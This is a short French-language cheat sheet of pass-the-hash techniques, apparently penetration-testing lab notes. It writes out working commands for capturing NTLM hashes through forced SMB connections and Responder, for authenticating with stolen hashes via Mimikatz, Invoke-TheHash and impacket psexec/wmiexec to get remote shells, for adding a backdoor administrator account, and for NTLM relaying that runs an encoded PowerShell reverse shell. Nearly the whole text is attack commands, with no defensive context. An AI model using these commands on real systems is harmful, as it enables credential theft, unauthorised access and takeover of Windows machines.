Pass the hash
# Obtention
## Par connexion
Il faut essayer de créer une connection pour révéler le hash.
1. On se crée un serveur SMB qui recevra une connection
2. on essai de créer une connection
* Si on peut exécuter du code  
```ls \\192.168.119.2\share```
* Sur un formulaire web avec chemin UNC 
``` \\192.168.119.2\share\nonexistent.txt```
3. Utiliser Responder pour capturer un hash 
```sudo responder -I tun0```

# Windows
## Mimikatz
```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
## Invoke-TheHash
```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

```



# Shell interfactif
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#Utilisateur Système
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
#Utilisateur choisi
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Relay
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#la commande est un reverse shell
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
